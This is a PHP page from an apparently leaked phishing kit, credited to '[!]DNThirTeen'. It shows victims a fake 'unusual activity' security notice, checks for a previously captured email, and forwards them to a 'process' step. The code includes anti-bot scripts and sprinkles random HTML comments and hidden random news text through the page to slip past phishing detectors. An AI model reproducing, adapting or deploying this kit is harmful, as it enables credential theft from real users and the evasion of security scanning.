<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge"><?php echo "<!--".rand(0,99999999)."-->"?>
	<link rel="shortcut icon" href="lib/pics/favi.ico">
	<link rel="apple-touch-icon" href="lib/pics/favi.png"><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
		<title><?php echo $lg_activity['title']?></title><?php echo "<!--".rand(0,99999999)."-->"?>
	<link rel="stylesheet" href="lib/styles/unusual.css"><?php echo "<!--".rand(0,99999999)."-->"?>
</head>
<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
 <?php echo "<!--".rand(0,99999999)."-->"?>   <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
	<div>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="centered"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div style="text-align:center"><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>			<header>
					<div class="logo"></div><?php echo "<!--".rand(0,99999999)."-->"?>
				</header><?php echo "<!--".rand(0,99999999)."-->"?>
				<div>
					<h1><?php echo $lg_activity['head']?></h1>
<?php echo "<!--".rand(0,99999999)."-->"?>					<div>
						<p class="text"><?php echo $lg_activity['body']?>.</p>
					</div>
				<input type="button" class="button" value="<?php echo $lg_activity['bt_secure']?>" id="btn">
				</div>
				</div>
				<div class="hide" id="rotate"><?php echo "<!--".rand(0,99999999)."-->"?>
					<div class="spinner">
						<div class="rotate"></div>
						<div class="processing"><?php echo $lg_sign['rotate']?></div>
					</div>
			<?php echo "<!--".rand(0,99999999)."-->"?>			<div class="overlay"></div>
					</div>
				</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div>
			<footer>
				<ul>
					<li>
						<a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a>
					</li><?php echo "<!--".rand(0,99999999)."-->"?>
					<li><?php echo "<!--".rand(0,99999999)."-->"?>
						<a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a>
					</li><?php echo "<!--".rand(0,99999999)."-->"?>
				</ul>
			</footer>
		<script>document.getElementById("btn").onclick=function(){
		document.getElementById("rotate").classList.remove("hide");
	setTimeout(function(){
	window.location.href="process"},1800)};
		</script>
</body>
</html>